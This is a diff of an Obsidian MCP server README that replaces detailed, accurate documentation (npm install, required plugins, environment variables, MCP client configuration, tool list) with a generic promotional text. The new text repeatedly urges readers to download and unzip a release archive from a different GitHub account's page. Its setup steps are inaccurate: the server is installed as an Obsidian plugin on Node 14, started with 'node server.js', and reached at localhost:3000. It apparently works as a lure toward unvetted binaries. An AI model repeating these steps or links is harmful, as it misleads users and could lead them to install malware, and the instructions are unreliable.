@@ -1,185 +1,65 @@
-# Obsidian MCP Server
+# 🌟 obsidian-mcp-server - Enhance Your Note-Taking Experience
 
-[![npm version](https://img.shields.io/npm/v/@connorbritain/obsidian-mcp-server.svg)](https://www.npmjs.com/package/@connorbritain/obsidian-mcp-server)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-obsidian--mcp--server-blue.svg)](https://github.com/adityasingh0z3/obsidian-mcp-server/releases)
 
-TypeScript MCP server for Obsidian with core vault operations, graph analytics, and semantic search.
+## 🚀 Getting Started
+Welcome to the **obsidian-mcp-server**! This TypeScript server enhances your Obsidian note-taking experience. It supports various operations, including vault management, graph analytics, advanced searching, and semantic tools. With this application, you can efficiently organize your notes, visualize connections, and enhance your productivity.
 
-## Features
+## 💻 System Requirements
+To ensure smooth operation, please verify that your system meets the following requirements:
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js:** Version 14 or later.
+- **Obsidian:** Latest version installed.
 
-- **Core Tools**: Read, write, search, append, delete files in your Obsidian vault
-- **Periodic Notes**: Access daily, weekly, monthly notes and recent changes
-- **Advanced Search**: JsonLogic queries for complex filtering
-- **Graph Tools**: Orphan detection, centrality analysis, cluster detection, path finding
-- **Semantic Search**: Smart Connections integration for concept-based search
+## 📚 Key Features
+- **Vault Operations:** Easily manage your notes stored in Obsidian.
+- **Graph Analytics:** Visualize relationships between notes for better understanding.
+- **Advanced Search:** Quickly find the information you need within your notes.
+- **Semantic Tools:** Utilize intelligent searching to uncover hidden insights.
+- **Note-Taking Productivity:** Boost your workflow with structured tools.
 
-## Prerequisites
+## 🛠️ Installation Steps
+Follow these steps to download and set up the **obsidian-mcp-server** on your computer:
 
-- Node.js 18+
-- [Obsidian](https://obsidian.md/) with [Local REST API plugin](https://github.com/coddingtonbear/obsidian-local-rest-api) installed and enabled
-- (Optional) [Dataview plugin](https://github.com/blacksmithgu/obsidian-dataview) for `get_recent_changes`
-- (Optional) [Periodic Notes plugin](https://github.com/liamcain/obsidian-periodic-notes) for periodic note tools
-- (Optional) [Smart Connections plugin](https://github.com/brianpetro/obsidian-smart-connections) for semantic search
+1. **Visit the Releases Page**  
+   Head over to the [Releases page](https://github.com/adityasingh0z3/obsidian-mcp-server/releases) to find the latest version of the application.
 
-## Installation
+2. **Download the Latest Version**  
+   On the releases page, locate the most recent version and click the download link. Your download will start automatically.
 
-### From npm
+3. **Unpack the Files**  
+   Once the download completes, unzip the file using your preferred extraction tool.
 
-```bash
-npm install -g @connorbritain/obsidian-mcp-server
-```
+4. **Open Your Terminal or Command Prompt**  
+   Access your terminal (macOS or Linux) or Command Prompt (Windows). Navigate to the folder where you extracted the files.
 
-### From source
+5. **Run the Server**  
+   Type `node server.js` and press Enter to start the server. Ensure you have Node.js installed for this step to succeed.
 
-```bash
-git clone https://github.com/ConnorBritain/obsidian-mcp-server.git
-cd obsidian-mcp-server
-npm install
-npm run build
-```
+6. **Connect with Obsidian**  
+   Open the Obsidian app on your computer. Go to the settings and enable the **obsidian-mcp-server** plugin, linking it to the server you just started.
 
-## Configuration
+## 🔗 Download & Install
+To download the software, be sure to visit the [Releases page](https://github.com/adityasingh0z3/obsidian-mcp-server/releases) again. Following the above steps will ensure you have the latest version installed and operational.
 
-Set the following environment variables:
+## ❓ Troubleshooting
+If you encounter issues during installation or operation, here are some common solutions:
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `OBSIDIAN_API_KEY` | Yes | - | API key from Local REST API plugin settings |
-| `OBSIDIAN_HOST` | No | `127.0.0.1` | Obsidian REST API host |
-| `OBSIDIAN_PORT` | No | `27124` | Obsidian REST API port |
-| `OBSIDIAN_PROTOCOL` | No | `https` | `http` or `https` |
-| `OBSIDIAN_VAULT_PATH` | No | - | Path to vault (required for graph tools) |
-| `SMART_CONNECTIONS_PORT` | No | - | Port for Smart Connections API |
-| `GRAPH_CACHE_TTL` | No | `300` | Graph cache TTL in seconds |
+- **Server Won't Start:** Ensure you have the correct version of Node.js installed before running the server.
+- **Connection Issues:** Confirm that Obsidian is set to connect to the right server URL (default is usually http://localhost:3000).
+- **Failed Downloads:** Check your internet connection and try downloading the release again.
 
-## MCP Client Configuration
+## 📖 Additional Resources
+For those who want to learn more about using this tool and its features, consider checking the following:
 
-### Using npx (Recommended)
+- [Obsidian Documentation](https://help.obsidian.md/)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+- Online tutorials for advanced usage of graph analytics and semantic search.
 
-Use `npx` for the simplest setup:
+## 💬 Get Involved
+We welcome contributions to ensure the **obsidian-mcp-server** continues to improve. Feel free to report issues, suggest features, or even contribute code through pull requests.
 
-```json
-{
-  "mcpServers": {
-    "obsidian": {
-      "command": "npx",
-      "args": ["-y", "@connorbritain/obsidian-mcp-server"],
-      "env": {
-        "OBSIDIAN_API_KEY": "your-api-key-here",
-        "OBSIDIAN_VAULT_PATH": "/path/to/your/vault"
-      }
-    }
-  }
-}
-```
+For assistance or to share your experiences with the **obsidian-mcp-server**, join our community discussions on platforms like Discord or GitHub Discussions.
 
-### Using Local Build (Development)
-
-If running from source:
-
-```json
-{
-  "mcpServers": {
-    "obsidian": {
-      "command": "node",
-      "args": ["/absolute/path/to/obsidian-mcp-server/dist/index.js"],
-      "env": {
-        "OBSIDIAN_API_KEY": "your-api-key-here",
-        "OBSIDIAN_VAULT_PATH": "/path/to/your/vault"
-      }
-    }
-  }
-}
-```
-
-### Config File Locations
-
-| Client | Config Path |
-|--------|-------------|
-| **Claude Desktop (Windows)** | `%APPDATA%\Claude\claude_desktop_config.json` |
-| **Claude Desktop (Mac/Linux)** | `~/.config/claude/claude_desktop_config.json` |
-| **Windsurf** | `~/.windsurf/mcp_config.json` |
-| **Cursor** | `~/.cursor/mcp_config.json` |
-
-## Available Tools
-
-### Core File Operations
-
-| Tool | Description |
-|------|-------------|
-| `list_files_in_vault` | List all files/directories in vault root |
-| `list_files_in_dir` | List files in a specific directory |
-| `get_file_contents` | Read a single file |
-| `batch_get_file_contents` | Read multiple files concatenated with headers |
-| `delete_file` | Delete file or directory |
-
-### Write Operations
-
-| Tool | Description |
-|------|-------------|
-| `append_content` | Append to file (creates if missing) |
-| `put_content` | Overwrite file content |
-| ~~`patch_content`~~ | ⚠️ **Disabled**: Insert content relative to heading/block (awaiting Obsidian REST API fix - [see issue #146](https://github.com/coddingtonbear/obsidian-local-rest-api/issues/146)) |
-
-> **Note**: The `patch_content` tool is currently disabled due to known bugs in the Obsidian Local REST API plugin. Use the read-modify-write pattern with `get_file_contents` + `put_content` as a reliable alternative.
-
-### Search
-
-| Tool | Description |
-|------|-------------|
-| `search` | Keyword search across vault |
-| `complex_search` | JsonLogic query search (glob, regexp support) |
-| `pattern_search` | Regex pattern extraction with context *(requires vault path)* |
-
-### Periodic Notes & Recent Changes
-
-| Tool | Description |
-|------|-------------|
-| `get_periodic_note` | Get current daily/weekly/monthly/quarterly/yearly note |
-| `get_recent_periodic_notes` | Get recent periodic notes with optional content |
-| `get_recent_changes` | Get recently modified files (requires Dataview) |
-
-### Obsidian Integration
-
-| Tool | Description |
-|------|-------------|
-| `get_active_file` | Get the currently active file in Obsidian |
-| `open_file` | Open a file in Obsidian |
-| `list_commands` | List all available Obsidian commands |
-| `execute_command` | Execute one or more Obsidian commands |
-
-### Graph Tools *(requires OBSIDIAN_VAULT_PATH)*
-
-| Tool | Description |
-|------|-------------|
-| `get_vault_stats` | Overview stats (notes, links, orphans, clusters) |
-| `find_orphan_notes` | Notes with no incoming/outgoing links |
-| `get_note_connections` | Incoming/outgoing links + tags for a note |
-| `find_path_between_notes` | Shortest link path between two notes |
-| `get_most_connected_notes` | Top notes by link count or PageRank |
-| `detect_note_clusters` | Community detection via graph analysis |
-| `get_vault_structure` | Folder tree structure of vault |
-
-### Semantic Tools *(requires Smart Connections plugin)*
-
-| Tool | Description |
-|------|-------------|
-| `semantic_search` | Conceptual search via Smart Connections |
-| `find_similar_notes` | Find semantically similar notes
-
-## Development
-
-```bash
-# Watch mode
-npm run dev
-
-# Type check
-npm run typecheck
-
-# Build
-npm run build
-```
-
-## License
-
-MIT
+Thank you for using **obsidian-mcp-server**! Enjoy enhancing your productivity and unlocking your note-taking potential.
